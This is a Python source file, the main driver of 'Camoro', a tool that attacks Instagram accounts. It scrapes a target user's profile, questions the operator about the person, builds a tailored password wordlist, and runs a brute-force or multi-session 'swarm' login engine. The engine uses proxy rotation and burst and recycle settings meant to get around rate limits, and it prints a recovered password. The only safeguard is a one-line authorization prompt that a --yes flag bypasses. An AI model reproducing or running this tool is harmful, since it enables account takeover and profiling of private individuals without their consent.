#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camoro v1.0.0
Instagram OSINT + Intelligence Interview + AI Wordlist + Brute/Swarm Engine
Compatible with Linux & Termux
"""

import argparse
import os
import sys

from core.banner import (
    Colors,
    show_banner,
    step,
    info,
    success,
    warn,
    error,
)
from core.osint import CamoroOSINT
from core.interviewer import Interviewer
from core.wordlist_ai import WordlistAI
from core.brute import BruteEngine
from core.swarm import SwarmEngine


def parse_args():
    p = argparse.ArgumentParser(
        prog="camoro",
        description="Camoro — Instagram OSINT + AI Wordlist + Brute/Swarm Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 camoro.py -u target_user
  python3 camoro.py -u target_user --osint-only
  python3 camoro.py -u target_user --wordlist-only --count 18000
  python3 camoro.py -u target_user -w output/target/wordlist.txt --brute
  python3 camoro.py -u target_user -w wordlist.txt --brute --swarm --sessions 100 --burst 20
  python3 camoro.py -u target_user --brute --resume
  python3 camoro.py -u target_user --proxy http://127.0.0.1:8080 --proxy-file proxies.txt
        """,
    )
    p.add_argument("-u", "--username", required=True, help="Target Instagram username")
    p.add_argument("-w", "--wordlist", default=None, help="Custom wordlist path")
    p.add_argument("--count", type=int, default=18000, help="Wordlist size (default: 18000)")
    p.add_argument(
        "--delay",
        nargs=2,
        type=float,
        metavar=("MIN", "MAX"),
        default=[3.0, 5.0],
        help="Classic brute delay range (default: 3 5)",
    )
    p.add_argument("--proxy", default=None, help="Single HTTP(S) proxy")
    p.add_argument("--proxy-file", default=None, help="Proxy list file (one per line)")
    p.add_argument("--osint-only", action="store_true", help="OSINT stage only")
    p.add_argument("--wordlist-only", action="store_true", help="OSINT+interview+wordlist only")
    p.add_argument("--brute", action="store_true", help="Attack only (needs wordlist)")
    p.add_argument("--swarm", action="store_true", help="Use swarm multi-link engine")
    p.add_argument("--sessions", type=int, default=50, help="Swarm sessions/links (default: 50)")
    p.add_argument("--workers", type=int, default=20, help="Swarm workers (default: 20)")
    p.add_argument("--burst", type=float, default=20.0, help="Burst window seconds (default: 20)")
    p.add_argument("--rps", type=float, default=8.0, help="Max global requests/sec (default: 8)")
    p.add_argument(
        "--rotate",
        default="round_robin",
        choices=["round_robin", "random", "sticky_burst"],
        help="API rotation strategy",
    )
    p.add_argument("--recycle", type=int, default=12, help="Recycle session after N uses")
    p.add_argument("--skip-interview", action="store_true", help="Skip interviewer")
    p.add_argument("--resume", action="store_true", help="Resume previous attack")
    p.add_argument("-o", "--output", default="output", help="Output directory")
    p.add_argument("--yes", action="store_true", help="Auto-confirm attack")
    return p.parse_args()


def confirm_attack(username, count, auto):
    if auto:
        return True
    print(
        "\n%s%s"
        "  You are about to launch credential testing against @%s\n"
        "  Wordlist size ≈ %s\n"
        "  Use ONLY on accounts you are authorized to test."
        "%s"
        % (Colors.FAIL, Colors.BOLD, username, count, Colors.ENDC)
    )
    try:
        ans = input("%sContinue? (Y/N): %s" % (Colors.YELLOW, Colors.ENDC)).strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    return ans in ("y", "yes")


def resolve_wordlist(args, username):
    if args.wordlist:
        return args.wordlist
    return os.path.join(args.output, username, "wordlist.txt")


def run_attack(args, username, wl_path, out):
    with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
        n = sum(1 for line in f if line.strip())
    if not confirm_attack(username, n, args.yes):
        warn("Aborted by user")
        return None

    if args.swarm:
        step(4, 4, "SWARM ENGINE · MULTI-LINK / MULTI-API")
        engine = SwarmEngine(
            username=username,
            wordlist_path=wl_path,
            output_dir=out,
            sessions=args.sessions,
            workers=args.workers,
            burst_seconds=args.burst,
            max_rps=args.rps,
            proxy=args.proxy,
            proxy_file=args.proxy_file,
            rotate_strategy=args.rotate,
            resume=args.resume,
            recycle_every=args.recycle,
        )
        return engine.run()

    step(4, 4, "BRUTE FORCE ENGINE")
    engine = BruteEngine(
        username=username,
        wordlist_path=wl_path,
        output_dir=out,
        delay_min=args.delay[0],
        delay_max=args.delay[1],
        proxy=args.proxy,
        resume=args.resume,
    )
    return engine.run()


def main():
    args = parse_args()
    username = args.username.strip().lstrip("@")
    out = args.output
    os.makedirs(out, exist_ok=True)
    os.makedirs(os.path.join(out, username), exist_ok=True)

    show_banner()
    info("Target locked: @%s" % username)
    if args.proxy:
        info("Proxy: %s" % args.proxy)
    if args.proxy_file:
        info("Proxy file: %s" % args.proxy_file)

    # ── brute-only ───────────────────────────────────────
    if args.brute and not args.osint_only and not args.wordlist_only:
        wl = resolve_wordlist(args, username)
        if not os.path.isfile(wl):
            error("No wordlist at %s — generate one first or pass -w" % wl)
            sys.exit(1)
        found = run_attack(args, username, wl, out)
        sys.exit(0 if found else 2)

    # ── STAGE 1: OSINT ───────────────────────────────────
    step(1, 4 if not args.osint_only else 1, "OSINT RECONNAISSANCE")
    osint = CamoroOSINT(username=username, output_dir=out, proxy=args.proxy)
    osint_data = osint.scrape()
    if not osint_data:
        warn("OSINT returned empty — continuing with manual intel only")
    hints = osint.hints_for_wordlist() if osint_data else {"username": username}

    if args.osint_only:
        success("OSINT-only run complete")
        sys.exit(0)

    # ── STAGE 2: INTERVIEW ───────────────────────────────
    step(2, 4, "INTELLIGENCE INTERVIEW")
    if args.skip_interview:
        warn("Interview skipped")
        answers = {
            "username": username,
            "full_name": hints.get("full_name", ""),
            "osint_tokens": hints.get("bio_tokens", []),
            "osint_years": hints.get("years", []),
            "osint_phones": hints.get("phones", []),
        }
    else:
        answers = Interviewer(username, hints, out).run()

    # ── STAGE 3: AI WORDLIST ─────────────────────────────
    step(3, 4, "AI WORDLIST GENERATION")
    ai = WordlistAI(answers, target_count=args.count)
    ai.generate()
    wl_path = os.path.join(out, username, "wordlist.txt")
    ai.save(wl_path)

    if args.wordlist_only:
        success("Wordlist-only run complete")
        print("  Use classic: python3 camoro.py -u %s -w %s --brute" % (username, wl_path))
        print("  Use swarm  : python3 camoro.py -u %s -w %s --brute --swarm" % (username, wl_path))
        sys.exit(0)

    # ── STAGE 4: ATTACK ──────────────────────────────────
    found = run_attack(args, username, wl_path, out)
    if found:
        print(
            "\n%s%s"
            "╔══════════════════════════════════════════╗\n"
            "║  CAMORO · ACCESS CREDENTIAL RECOVERED    ║\n"
            "╚══════════════════════════════════════════╝"
            "%s"
            % (Colors.OKGREEN, Colors.BOLD, Colors.ENDC)
        )
        print("  Username : %s" % username)
        print("  Password : %s%s%s" % (Colors.BOLD, found, Colors.ENDC))
        sys.exit(0)

    warn("Finished without valid password in list")
    sys.exit(2)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n%s[!] Interrupted%s" % (Colors.WARNING, Colors.ENDC))
        sys.exit(130)
